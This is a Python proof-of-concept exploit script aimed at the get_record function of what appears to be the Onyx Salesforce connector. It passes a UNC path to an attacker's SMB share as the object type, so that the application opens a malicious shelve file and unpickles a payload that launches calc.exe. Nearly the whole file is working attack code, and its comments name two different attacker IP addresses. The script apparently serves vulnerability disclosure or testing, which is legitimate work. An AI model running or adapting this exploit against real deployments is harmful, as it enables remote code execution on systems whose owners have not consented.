from onyx.connectors.salesforce.shelve_stuff.shelve_functions import get_record

# 1. Define the UNC path pointing to the attacker's SMB share.
# The application will append '\data.shelf' to this path.
# So if object_type is '\\192.168.1.100\share', the app looks for '\\192.168.1.100\share\data.shelf'
attacker_unc_path = r"\\192.168.1.90\lab_share"

# 2. Define the object_id that matches the key we inserted into the malicious shelf
target_object_id = "malicious_key"

print(f"[*] Triggering get_record with UNC path: {attacker_unc_path}")

# 3. Call the vulnerable function
# This will execute: shelve.open(r'\\192.168.1.100\share\data.shelf')
# and then access db['malicious_key'], triggering pickle.loads() and executing calc.exe
try:
    record = get_record(object_id=target_object_id, object_type=attacker_unc_path)
except Exception as e:
    # Expected to raise an exception or hang briefly while executing the payload
    pass

print("[*] Exploit execution finished.")